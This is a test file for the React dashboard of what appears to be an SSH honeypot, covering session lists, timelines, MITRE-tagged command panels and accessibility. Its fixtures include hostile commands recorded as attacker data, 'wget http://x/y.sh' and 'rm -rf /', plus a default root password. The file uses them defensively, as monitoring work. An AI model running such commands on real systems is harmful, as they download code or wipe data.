import { describe, it, expect, vi } from "vitest";
import { render, screen, fireEvent, within } from "@testing-library/react";
import ErrorBoundary from "../components/common/ErrorBoundary";
import SessionsPanel from "../components/SessionsPanel";
import SessionDrawer from "../components/SessionDrawer";
import CommandsPanel from "../components/CommandsPanel";
import AreaSparkline from "../components/common/AreaSparkline";

const noop = () => {};
const fmtTs = (t) => (t ? `TS:${t}` : "—");
const fmtDur = (ms) => `${Math.round((ms || 0) / 1000)}s`;
const flag = () => "🏴";

const SESSION = {
  session_id: "abc123",
  src_ip: "1.2.3.4",
  country_iso: "CN",
  city: "Beijing",
  org: "Chinanet",
  started_at: "2026-08-16T10:00:00Z",
  duration_ms: 30000,
  events: 6,
  commands: 3,
  logins: 2,
};

const panelProps = {
  sessions: [SESSION],
  sessionsTotal: 1,
  sessionsError: "",
  sessionsLoading: false,
  search: "",
  onSearch: noop,
  onOpen: noop,
  formatTimestamp: fmtTs,
  formatDuration: fmtDur,
  countryFlag: flag,
  isMobile: false,
};

describe("ErrorBoundary", () => {
  it("contains a crashing panel and leaves siblings rendered", () => {
    const Boom = () => { throw new Error("kaboom"); };
    vi.spyOn(console, "error").mockImplementation(() => {});
    render(
      <div>
        <ErrorBoundary name="Top commands"><Boom /></ErrorBoundary>
        <p>sibling survived</p>
      </div>
    );
    expect(screen.getByRole("alert")).toHaveTextContent("Top commands failed to render");
    expect(screen.getByText("sibling survived")).toBeInTheDocument();
    vi.restoreAllMocks();
  });

  it("renders children untouched when nothing throws", () => {
    render(<ErrorBoundary name="X"><p>fine</p></ErrorBoundary>);
    expect(screen.getByText("fine")).toBeInTheDocument();
    expect(screen.queryByRole("alert")).toBeNull();
  });
});

describe("SessionsPanel", () => {
  it("exposes each session through a keyboard-reachable control", () => {
    const onOpen = vi.fn();
    render(<SessionsPanel {...panelProps} onOpen={onOpen} />);
    // A <tr onClick> alone is mouse-only; the row must offer a real button.
    const btn = screen.getByRole("button", { name: /view timeline for session from 1\.2\.3\.4/i });
    fireEvent.click(btn);
    expect(onOpen).toHaveBeenCalledWith("abc123");
  });

  it("distinguishes an empty search result from having no data at all", () => {
    const { rerender } = render(<SessionsPanel {...panelProps} sessions={[]} search="zzz" />);
    expect(screen.getByText(/no sessions match that search/i)).toBeInTheDocument();
    rerender(<SessionsPanel {...panelProps} sessions={[]} search="" />);
    expect(screen.getByText(/no sessions in the last 24 hours/i)).toBeInTheDocument();
  });

  it("shows an error without hiding the panel", () => {
    render(<SessionsPanel {...panelProps} sessions={[]} sessionsError="boom" />);
    expect(screen.getByText(/failed to load sessions: boom/i)).toBeInTheDocument();
  });

  it("renders the mobile layout only, not both at once", () => {
    const { container } = render(<SessionsPanel {...panelProps} isMobile />);
    expect(container.querySelector("table")).toBeNull();
    expect(screen.getByRole("button", { name: /1\.2\.3\.4/ })).toBeInTheDocument();
  });
});

describe("SessionDrawer", () => {
  const data = {
    session: { ...SESSION, truncated: false },
    events: [
      { timestamp: "2026-08-16T10:00:00Z", command: null, username: null, password: null, tags: [] },
      { timestamp: "2026-08-16T10:00:05Z", command: null, username: "root", password: "123456", tags: [] },
      { timestamp: "2026-08-16T10:00:20Z", command: "wget http://x/y.sh", username: null, password: null, tags: ["T1105"] },
    ],
  };
  const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)", badgeColor: "" } };

  const drawerProps = {
    data, loading: false, error: "", onClose: noop,
    formatTimestamp: fmtTs, formatDuration: fmtDur, countryFlag: flag, mitreById,
  };

  it("renders the timeline as connect, login, then command with its technique", () => {
    render(<SessionDrawer {...drawerProps} />);
    const dialog = screen.getByRole("dialog", { name: /session timeline/i });
    expect(within(dialog).getByText("session opened")).toBeInTheDocument();
    expect(within(dialog).getByText("root / 123456")).toBeInTheDocument();
    expect(within(dialog).getByText("wget http://x/y.sh")).toBeInTheDocument();
    expect(within(dialog).getByText(/ingress tool transfer/i)).toBeInTheDocument();
  });

  it("moves focus to the close button so keyboard users land inside", () => {
    render(<SessionDrawer {...drawerProps} />);
    expect(screen.getByRole("button", { name: /close session timeline/i })).toHaveFocus();
  });

  it("restores focus to the opener when unmounted", () => {
    const opener = document.createElement("button");
    document.body.appendChild(opener);
    opener.focus();
    const { unmount } = render(<SessionDrawer {...drawerProps} />);
    expect(opener).not.toHaveFocus();
    unmount();
    expect(opener).toHaveFocus();
    opener.remove();
  });

  it("locks background scrolling while open and releases it after", () => {
    const { unmount } = render(<SessionDrawer {...drawerProps} />);
    expect(document.body.style.overflow).toBe("hidden");
    unmount();
    expect(document.body.style.overflow).not.toBe("hidden");
  });

  it("warns when the timeline was truncated", () => {
    render(<SessionDrawer {...drawerProps} data={{ ...data, session: { ...data.session, truncated: true } }} />);
    expect(screen.getByText(/timeline truncated/i)).toBeInTheDocument();
  });
});

describe("CommandsPanel", () => {
  const props = {
    commands: [{ command: "rm -rf /", total: 5, unique_ips: 2, tags: ["T1490"] }],
    commandsError: "", commandsLoading: false, commandsTotal: 1,
    commandFilter: "all", setCommandFilter: noop, isCommandFilterActive: false,
    commandTagCounts: { T1490: 1, T1105: 0 },
    mitreSignatures: [
      { id: "T1490", name: "Impact (T1490)", description: "d", badgeColor: "" },
      { id: "T1105", name: "Ingress (T1105)", description: "d", badgeColor: "" },
    ],
    mitreById: { T1490: { id: "T1490", name: "Impact (T1490)", badgeColor: "" } },
    search: "", onSearch: noop, pageSize: 100, isMobile: false,
  };

  it("tags rows from the ids the API returns", () => {
    render(<CommandsPanel {...props} />);
    expect(screen.getByText("rm -rf /")).toBeInTheDocument();
    expect(screen.getAllByText("Impact (T1490)").length).toBeGreaterThan(0);
  });

  it("disables technique chips that match nothing", () => {
    render(<CommandsPanel {...props} />);
    expect(screen.getByRole("button", { name: /Ingress \(T1105\) \(0\)/ })).toBeDisabled();
    expect(screen.getByRole("button", { name: /Impact \(T1490\) \(1\)/ })).toBeEnabled();
  });

  it("explains an empty result differently when a filter is active", () => {
    render(<CommandsPanel {...props} commands={[]} isCommandFilterActive commandFilter="T1105" />);
    expect(screen.getByText(/no commands match the current search or filter/i)).toBeInTheDocument();
  });

  it("survives rows the API sent without a tags array", () => {
    // Guards the class of bug that used to blank the page: an unexpected shape.
    render(<CommandsPanel {...props} commands={[{ command: "ls", total: 1, unique_ips: 1 }]} />);
    expect(screen.getByText("ls")).toBeInTheDocument();
  });
});

describe("AreaSparkline", () => {
  const data = [
    { label: "10:00", value: 5 },
    { label: "11:00", value: 20 },
    { label: "12:00", value: 0 },
  ];

  it("describes itself for screen readers instead of being a bare graphic", () => {
    render(<AreaSparkline data={data} />);
    expect(screen.getByRole("img", { name: /events per hour.*peak 20/i })).toBeInTheDocument();
  });

  it("renders nothing rather than an empty axis when there is no data", () => {
    const { container } = render(<AreaSparkline data={[]} />);
    expect(container.querySelector("svg")).toBeNull();
  });

  it("handles an all-zero series without dividing by zero", () => {
    const { container } = render(<AreaSparkline data={[{ label: "a", value: 0 }, { label: "b", value: 0 }]} />);
    const path = container.querySelector("path[stroke='#34d399']");
    expect(path.getAttribute("d")).not.toMatch(/NaN/);
  });

  it("places a single point without producing NaN coordinates", () => {
    const { container } = render(<AreaSparkline data={[{ label: "only", value: 3 }]} />);
    expect(container.querySelector("path").getAttribute("d")).not.toMatch(/NaN/);
  });
});
